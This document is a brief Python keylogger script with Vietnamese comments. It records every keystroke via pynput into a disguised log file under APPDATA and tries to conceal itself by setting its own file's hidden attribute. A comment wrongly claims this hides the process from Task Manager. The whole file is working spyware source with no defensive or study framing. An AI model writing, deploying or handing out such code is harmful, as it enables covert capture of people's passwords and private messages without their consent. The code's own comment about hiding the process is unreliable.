from pynput import keyboard
import logging
import os
import sys
import subprocess

def get_log_path():
    # Đặt file log trong thư mục ẩn của hệ thống
    log_dir = os.path.join(os.getenv('APPDATA'), 'KeyLogger')
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    return os.path.join(log_dir, 'sys_event.txt')

log_file = get_log_path()
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Ẩn tiến trình khỏi Task Manager (chạy như tiến trình hệ thống)
def hide_process():
    try:
        if sys.platform == "win32":
            subprocess.call("attrib +h " + sys.argv[0], shell=True)
    except Exception as e:
        logging.error(f"Error hiding process: {e}")

def on_press(key):
    try:
        logging.info(str(key.char))  # Ghi lại ký tự
    except AttributeError:
        logging.info(str(key))  # Ghi lại phím đặc biệt

hide_process()  # Ẩn tiến trình

# Lắng nghe bàn phím
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()